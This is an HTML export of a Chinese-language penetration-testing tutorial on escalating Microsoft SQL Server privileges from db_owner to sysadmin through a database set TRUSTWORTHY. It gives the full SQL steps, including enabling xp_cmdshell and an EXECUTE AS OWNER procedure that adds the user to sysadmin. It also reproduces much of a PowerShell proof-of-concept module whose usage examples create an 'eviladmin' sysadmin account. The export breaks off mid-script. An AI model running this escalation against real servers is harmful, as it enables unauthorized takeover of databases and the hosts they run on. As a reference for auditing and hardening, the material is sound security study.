<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="mssql-受信用数据库提权"><span class="csDE05BCC">Mssql </span><span class="csECDA2D3">受信用数据库提权</span></a></h1>
		<h2 class="cs868C439D">
			<a name="Xb05c28b5749b78a2d8624859281cf6197e741f7"><span class="csB2D98684">0x01 </span><span class="cs83F14626">前提</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">前提条件，我们获取</span><span class="cs8926E06">sqlserver</span><span class="cs9C1B1871">一个名为</span><span class="cs8926E06">MyAppUser01 </span><span class="cs9C1B1871">的用户密码，这个用户对</span><span class="cs8926E06">MyTestdb01</span><span class="cs9C1B1871">有</span><span class="cs8926E06">db_owner</span><span class="cs9C1B1871">权限，并且对</span><span class="cs8926E06">MyTestdb01</span><span class="cs9C1B1871">受信用，然后我们可以利用这个用户提权到</span><span class="cs8926E06">syadmin</span><span class="cs9C1B1871">权限</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试服务器版本</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image0.png" width="560" height="241" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X6ccade0383a19f94355dc7573fa7793a11f4c0d"><span class="csB2D98684">0x02</span><span class="cs83F14626">创建用户，受信用数据库</span></a></h2>
		<h4 class="cs868C439D">
			<a name="Xddee708c8ec3e4bd48b8673ca9e57ecf6d74c8c"><span class="csBF12A472">1.</span><span class="cs6EDCDAE2">创建数据库</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">CREATE DATABASE MyTestdb01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT suser_sname(owner_sid)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">FROM sys.databases</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">WHERE name = &#39;MyTestdb01&#39;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image1.png" width="560" height="296" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="Xaabe7984137cd7560861275be65f776662319ef"><span class="csBF12A472">2.</span><span class="cs6EDCDAE2">创建用户</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">创建一个测试用户</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE LOGIN MyAppUser01 WITH PASSWORD = &#39;MyPassword!&#39;;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image2.png" width="560" height="236" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里可以看到用户为</span><span class="cs8926E06">public</span><span class="cs9C1B1871">角色</span></p><h4 class="cs868C439D">
			<a name="X96db76107b07a3bd1e8a2531d1550428c672d28"><span class="csBF12A472">3.</span><span class="cs6EDCDAE2">在</span><span class="csBF12A472">&quot;MyTestdb01&quot;</span><span class="cs6EDCDAE2">数据库中为</span><span class="csBF12A472">&quot;MyAppUser01&quot;</span><span class="cs6EDCDAE2">分配</span><span class="csBF12A472">&quot;db_owner&quot;</span><span class="cs6EDCDAE2">角色</span><span class="csBF12A472">,</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">DB_owner</span><span class="cs9C1B1871">权限，</span><span class="cs8926E06">DB</span><span class="cs9C1B1871">是</span><span class="cs8926E06">database</span><span class="cs9C1B1871">的缩写，</span><span class="cs8926E06">owner</span><span class="cs9C1B1871">即拥有者的意思。它是指某个数据库的拥有者，它拥有了对数据库的修改、删除、新增数据表，执行大部分存储过程的权限。</span></p><p class="cs3A447A38"><span class="cs9FB05234">USE MyTestdb01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ALTER LOGIN [MyAppUser01] with default_database = [MyTestdb01];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE USER [MyAppUser01] FROM LOGIN [MyAppUser01];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EXEC sp_addrolemember [db_owner], [MyAppUser01];</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image3.png" width="560" height="338" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X46a5ac05ef27bf8835c2dc1f0b33b91983a9ffd"><span class="csBF12A472">4.</span><span class="cs6EDCDAE2">确认</span><span class="csBF12A472">&quot;MyAppUser01&quot;</span><span class="cs6EDCDAE2">已添加为</span><span class="csBF12A472">db_owner</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">select rp.name as database_role, mp.name as database_user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from sys.database_role_members drm</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image4.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Myappuser01</span><span class="cs9C1B1871">确实为</span><span class="cs8926E06">db_owner</span><span class="cs9C1B1871">的权限</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image5.png" width="560" height="473" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看</span><span class="cs8926E06">myappusr01</span><span class="cs9C1B1871">的属性也可以看到</span></p><h4 class="cs868C439D">
			<a name="X5cbfc453766dfb282c5f5545222f0a8da999650"><span class="csBF12A472">5.</span><span class="cs6EDCDAE2">将</span><span class="csBF12A472">&quot;MyTestdb01&quot;</span><span class="cs6EDCDAE2">数据库设置为受信任。</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">ALTER DATABASE MyTestdb01 SET TRUSTWORTHY ON</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image6.png" width="560" height="371" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="Xc727b31fbe57010758ec083607538386bff1bc4"><span class="csBF12A472">6.</span><span class="cs6EDCDAE2">下面的查询将返回</span><span class="csBF12A472">SQL Server</span><span class="cs6EDCDAE2">实例中的所有数据库，并且应将</span><span class="csBF12A472">&quot;MyTestdb01 &quot;</span><span class="cs6EDCDAE2">和</span><span class="csBF12A472">&quot;MSDB&quot;</span><span class="cs6EDCDAE2">数据库标记为可信任。</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">SELECT a.name,b.is_trustworthy_on</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">FROM master..sysdatabases as a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">INNER JOIN sys.databases as b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ON a.name=b.name;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image7.png" width="560" height="590" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&quot;1&quot;</span><span class="cs9C1B1871">就是受信用</span></p><h4 class="cs868C439D">
			<a name="Xf048fb07b1a268cdc4c15c9ab2523ef559d1143"><span class="csBF12A472">7.</span><span class="cs6EDCDAE2">开启</span><span class="csBF12A472">xp_cmdshell</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">EXEC sp_configure &#39;show advanced options&#39;,1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">RECONFIGURE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GO</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">RECONFIGURE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GO</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image8.png" width="560" height="257" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X222385c39fa52bc5beb701abf0d042d5ea976dc"><span class="csB2D98684">0x02 </span><span class="cs83F14626">提权</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">MyAppUser01</span><span class="cs9C1B1871">用户登录，新建查询，看看我们的权限，这里不要用之前的查询，因为那是</span><span class="cs8926E06">sa</span><span class="cs9C1B1871">的查询</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">看看我们的是否为</span><span class="cs8926E06">sysadmin</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image9.png" width="560" height="439" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.</span><span class="cs9C1B1871">新建一个</span><span class="cs8926E06">sp_elevate_me</span><span class="cs9C1B1871">查询</span></p><p class="cs3A447A38"><span class="cs9FB05234">USE MyTestdb01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GO</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE PROCEDURE sp_elevate_me</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">WITH EXECUTE AS OWNER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">AS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EXEC sp_addsrvrolemember &#39;MyAppUser01&#39;,&#39;sysadmin&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GO</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image10.png" width="560" height="266" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.</span><span class="cs9C1B1871">提权至</span><span class="cs8926E06">sysadmin</span></p><p class="cs3A447A38"><span class="cs9FB05234">USE MyTestdb01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EXEC sp_elevate_me</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image11.png" width="560" height="193" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再次检查权限</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image12.png" width="560" height="413" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">已经是</span><span class="cs8926E06">sysadmin</span><span class="cs9C1B1871">权限了，查看用户的属性也可以看到已经到</span><span class="cs8926E06">sysadmin</span><span class="cs9C1B1871">权限了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image13.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里可以利用脚本已经一键利用</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">Invoke-SqlServer-Escalate-Dbowner.psm1</span></p><p class="cs3A447A38"><span class="cs9FB05234">function Invoke-SqlServer-Escalate-DbOwner</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.SYNOPSIS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This script can be used escalate privileges from a db_owner to a sysadmin on SQL Server. </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.DESCRIPTION</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This script can be used escalate privileges from a db_owner to a sysadmin on SQL Server.This is </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;possible when a user has the db_owner role in a trusted database owned by a sysadmin . &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This script can accept SQL Credentials or use the current user&#39;s trusted connection.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.EXAMPLE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Getting sysadmin as a user that has the db_owner role in a trusted database owned by a sysadmin.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS C:\&gt; Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Connected.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Enumerating accessible trusted databases owned by sysadmins...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] 3 accessible databases found.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Checking if current user has db_owner role in any of them...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] myappuser as db_owner role in 2 databases.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Attempting to evelate myappuser to sysadmin via master database...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Success! - myappuser is now a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] All done.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.EXAMPLE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Creating new sysadmin, using a user that has the db_owner role in a trusted database owned by a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS C:\&gt; Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Attempting to Connect to SQLServer1\SQLEXPRESS as myappuser...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Connected.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Enumerating accessible trusted databases owned by sysadmins...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Found 2 trusted databases owned by a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Checking if myappuser the has db_owner role in any of them...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] myappuser has db_owner role in 1 of the databases.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Attempting to create and add eviladmin to the sysadmin role via the MyAppDb database...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Success! - eviladmin is now a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] All done.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.LINK</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.netspi.com</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.NOTES</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Author: Scott Sutherland - 2014, NetSPI</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version: Invoke-SqlServer-Escalate-DbOwner.psm1 v1.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comments: Should work on SQL Server 2005 and Above.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;[CmdletBinding()]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Param(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login username.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlUser,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login password.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlPass,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login username.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$newuser,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login password.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$newPass,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$true,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set target SQL Server instance.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlServerInstance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Connect to the sql server</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Create fun connection object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn = New-Object System.Data.SqlClient.SqlConnection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Set authentication type and create connection string &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($SqlUser -and $SqlPass){ &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SQL login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[string]$ConnectUser = $SqlUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Trusted connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UserDomain = [Environment]::UserDomainName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Username = &nbsp;[Environment]::UserName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ConnectUser = &quot;$UserDomain\$Username&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Status User</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write-host &quot;[*] Attempting to Connect to $SqlServerInstance as $ConnectUser...&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Attempt database connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Connected.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}catch{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ErrorMessage = $_.Exception.Message</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Connection failed&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Error: $ErrorMessage&quot; -foreground &quot;red&quot; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Create data tables for later</span><span class="cs8926E06"><br/></span><span 